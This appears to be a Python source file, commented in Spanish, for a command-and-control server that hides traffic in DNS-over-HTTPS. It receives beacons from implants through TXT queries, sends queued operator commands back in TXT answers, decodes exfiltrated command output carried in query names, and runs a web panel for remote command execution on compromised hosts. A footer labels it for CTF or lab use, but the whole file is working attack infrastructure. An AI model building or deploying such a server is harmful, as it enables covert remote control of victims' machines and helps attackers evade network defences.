import asyncio
import aiohttp
from aiohttp import web
import ssl
import json
import base64
from datetime import datetime
import dns.message
import dns.rdatatype
import dns.rdataclass
import dns.rrset
import os

# Configuración
CONFIG = {
    'HOST': '0.0.0.0',
    'PORT': 8443,
    'DOH_ENDPOINT': '/dns-query',
    'SESSION_TIMEOUT': 86400
}

class DoHC2Server:
    def __init__(self):
        self.app = web.Application()
        self.setup_routes()
        self.sessions = {}
        self.commands_queue = {}
        self.results = {}
        
    def setup_routes(self):
        """Configura endpoints"""
        self.app.router.add_get(CONFIG['DOH_ENDPOINT'], self.handle_doh_get)
        self.app.router.add_get('/health', self.handle_health)
        self.app.router.add_get('/admin', self.handle_admin)
        self.app.router.add_post('/admin/command', self.handle_admin_command)
        
    async def handle_doh_get(self, request):
        """Maneja GET requests DoH"""
        try:
            client_ip = request.remote
            print(f"\n[+] DNS Request from: {client_ip}")
            
            dns_query = request.query.get('dns', '')
            if dns_query:
                # Manejar padding
                padding = 4 - (len(dns_query) % 4)
                if padding != 4:
                    dns_query += '=' * padding
                
                decoded = base64.urlsafe_b64decode(dns_query)
                dns_msg = dns.message.from_wire(decoded)
                
                # Procesar query
                response = await self.process_dns_query(dns_msg, client_ip)
                return web.Response(
                    body=response.to_wire(),
                    content_type='application/dns-message'
                )
                
        except Exception as e:
            print(f"[!] DoH GET error: {e}")
            
        return web.Response(status=400)
    
    async def process_dns_query(self, dns_msg, client_ip):
        """Procesa query DNS y responde"""
        response = dns.message.make_response(dns_msg)
        
        for question in dns_msg.question:
            qname = str(question.name)
            qtype = question.rdtype
            
            print(f"[DNS] Query: {qname} (Type: {qtype})")
            
            if qtype == dns.rdatatype.TXT:
                if 'telemetry' in qname:
                    # Procesar beacon
                    session_id = qname.split('.')[0]
                    beacon_data = await self.process_beacon(session_id, qname, client_ip)
                    
                    # Responder con comandos (si hay)
                    if session_id in self.commands_queue and self.commands_queue[session_id]:
                        command = self.commands_queue[session_id].pop(0)
                        print(f"[C2] >>> Sending command to {session_id}: {command}")
                        
                        # Enviar comando en respuesta TXT
                        txt_data = f"cmd:{command}"
                        response.answer.append(
                            dns.rrset.from_text(
                                qname, 300, dns.rdataclass.IN,
                                dns.rdatatype.TXT, txt_data
                            )
                        )
                    else:
                        # Responder normal
                        txt_data = "status:ok"
                        response.answer.append(
                            dns.rrset.from_text(
                                qname, 300, dns.rdataclass.IN,
                                dns.rdatatype.TXT, txt_data
                            )
                        )
                
                elif 'result' in qname:
                    # Resultados de comandos
                    await self.process_result(qname)
            
            else:
                # Para otras queries, NXDOMAIN
                response.set_rcode(dns.rcode.NXDOMAIN)
        
        return response
    
    async def process_beacon(self, session_id, qname, client_ip):
        """Procesa beacon de implante"""
        try:
            # Intentar decodificar datos
            padding = 4 - (len(session_id) % 4)
            if padding != 4:
                session_id_padded = session_id + '=' * padding
            else:
                session_id_padded = session_id
                
            decoded = base64.urlsafe_b64decode(session_id_padded)
            data = json.loads(decoded)
            
            # Actualizar sesión
            self.sessions[session_id] = {
                'last_seen': datetime.now(),
                'data': data,
                'ip': client_ip,
                'hostname': data.get('id', session_id[:10])
            }
            
            print(f"[+] BEACON received:")
            print(f"    Session: {session_id}")
            print(f"    Hostname: {data.get('id', 'Unknown')}")
            print(f"    IP: {client_ip}")
            print(f"    Time: {datetime.now().strftime('%H:%M:%S')}")
            
            return data
            
        except Exception as e:
            print(f"[!] Error decoding beacon: {e}")
            # Si no se puede decodificar, usar ID raw
            self.sessions[session_id] = {
                'last_seen': datetime.now(),
                'data': {'id': session_id},
                'ip': client_ip,
                'hostname': session_id[:10]
            }
            return {'id': session_id}
    
    async def process_result(self, qname):
        """Procesa resultados de comandos"""
        try:
            session_id = qname.split('.')[0]
            padding = 4 - (len(session_id) % 4)
            if padding != 4:
                session_id_padded = session_id + '=' * padding
            else:
                session_id_padded = session_id
            
            decoded = base64.urlsafe_b64decode(session_id_padded)
            result = json.loads(decoded)
            
            print(f"[C2] <<< Command result from {session_id}:")
            print(f"    Command: {result.get('command', 'Unknown')}")
            print(f"    Result: {result.get('result', 'No result')[:200]}")
            print("-" * 50)
            
            # Guardar resultado
            if session_id not in self.results:
                self.results[session_id] = []
            self.results[session_id].append(result)
            
        except Exception as e:
            print(f"[!] Error processing result: {e}")
    
    async def handle_admin(self, request):
        """Panel de control web"""
        html = """
        <html>
        <head>
            <title>C2 Control Panel</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; }
                table { border-collapse: collapse; width: 100%; }
                th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
                th { background-color: #4CAF50; color: white; }
                tr:nth-child(even) { background-color: #f2f2f2; }
                .command-form { margin: 20px 0; }
                input[type=text] { padding: 5px; width: 300px; }
                button { padding: 5px 15px; background-color: #4CAF50; color: white; border: none; cursor: pointer; }
                button:hover { background-color: #45a049; }
            </style>
        </head>
        <body>
            <h1>🛡️ C2 Command & Control Panel</h1>
            <p>Active sessions: <strong>""" + str(len(self.sessions)) + """</strong></p>
            
            <h2>🖥️ Active Sessions</h2>
        """
        
        if self.sessions:
            html += """
            <table>
                <tr>
                    <th>Session ID</th>
                    <th>IP Address</th>
                    <th>Last Seen</th>
                    <th>Send Command</th>
                </tr>
            """
            
            for session_id, data in self.sessions.items():
                last_seen = data['last_seen'].strftime('%Y-%m-%d %H:%M:%S')
                hostname = data.get('hostname', 'unknown')
                ip = data.get('ip', 'unknown')
                
                html += f"""
                <tr>
                    <td>{hostname}</td>
                    <td>{ip}</td>
                    <td>{last_seen}</td>
                    <td>
                        <form action="/admin/command" method="post" class="command-form">
                            <input type="hidden" name="session_id" value="{session_id}">
                            <input type="text" name="command" placeholder="Enter command (e.g., whoami, systeminfo)" required>
                            <button type="submit">Execute</button>
                        </form>
                    </td>
                </tr>
                """
            
            html += "</table>"
        else:
            html += "<p>No active sessions. Waiting for implants to beacon...</p>"
        
        html += """
            <h2>📊 Command Results</h2>
            <div style="background: #f5f5f5; padding: 15px; border-radius: 5px; max-height: 400px; overflow-y: auto;">
        """
        
        if self.results:
            for session_id, results in self.results.items():
                html += f"<h3>Session: {session_id[:15]}...</h3>"
                for result in results[-3:]:  # Mostrar últimos 3 resultados
                    command = result.get('command', 'Unknown')
                    cmd_result = result.get('result', 'No result')
                    html += f"""
                    <div style="margin-bottom: 10px; padding: 10px; background: white; border-left: 4px solid #4CAF50;">
                        <strong>Command:</strong> {command}<br>
                        <strong>Result:</strong><br>
                        <pre style="background: #eee; padding: 10px; border-radius: 3px; overflow-x: auto;">{cmd_result[:500]}</pre>
                    </div>
                    """
        else:
            html += "<p>No command results yet.</p>"
        
        html += """
            </div>
            
            <h2>📋 Available Commands</h2>
            <ul>
                <li><code>whoami</code> - Current user</li>
                <li><code>systeminfo</code> - System information</li>
                <li><code>ipconfig</code> - Network configuration</li>
                <li><code>netstat -ano</code> - Network connections</li>
                <li><code>tasklist</code> - Running processes</li>
                <li><code>dir C:\\</code> - Directory listing</li>
                <li><code>echo Hello</code> - Test command</li>
            </ul>
            
            <hr>
            <p style="color: #666; font-size: 12px;">
                C2 Server | DoH Protocol | For CTF/Lab Use Only
            </p>
        </body>
        </html>
        """
        
        return web.Response(text=html, content_type='text/html')
    
    async def handle_admin_command(self, request):
        """Procesa comandos del panel de control"""
        try:
            data = await request.post()
            session_id = data.get('session_id')
            command = data.get('command')
            
            if session_id and command:
                if session_id not in self.commands_queue:
                    self.commands_queue[session_id] = []
                
                self.commands_queue[session_id].append(command)
                print(f"\n[+] Command queued for {session_id}: {command}")
                
                # Redirigir de vuelta al panel
                return web.HTTPFound('/admin')
            
        except Exception as e:
            print(f"[!] Error processing admin command: {e}")
        
        return web.Response(text="Error: Missing parameters", status=400)
    
    async def handle_health(self, request):
        """Endpoint de health check"""
        return web.Response(text='OK')
    
    async def run(self):
        """Ejecuta servidor"""
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.load_cert_chain('server.crt', 'server.key')
        
        runner = web.AppRunner(self.app)
        await runner.setup()
        
        site = web.TCPSite(
            runner,
            CONFIG['HOST'],
            CONFIG['PORT'],
            ssl_context=ssl_context
        )
        
        await site.start()
        
        print(f"\n{'='*60}")
        print(f"[*] RCE C2 Server running on https://{CONFIG['HOST']}:{CONFIG['PORT']}")
        print(f"[*] DoH endpoint: /dns-query")
        print(f"[*] Control Panel: https://localhost:{CONFIG['PORT']}/admin")
        print(f"[*] Health check: /health")
        print(f"[*] Waiting for implants to connect...")
        print(f"{'='*60}\n")
        
        await asyncio.Event().wait()

async def main():
    server = DoHC2Server()
    await server.run()

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════╗
    ║         RCE C2 SERVER WITH CONTROL PANEL    ║
    ║    Remote Code Execution via DoH            ║
    ╚══════════════════════════════════════════════╝
    """)
    
    # Verificar certificados
    if not os.path.exists('server.crt'):
        print("[*] Generating SSL certificates...")
        os.system(
            'openssl req -x509 -newkey rsa:4096 '
            '-keyout server.key -out server.crt '
            '-days 365 -nodes -subj "/CN=localhost" 2>/dev/null'
        )
        print("[+] Certificates generated")
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[*] Server stopped")
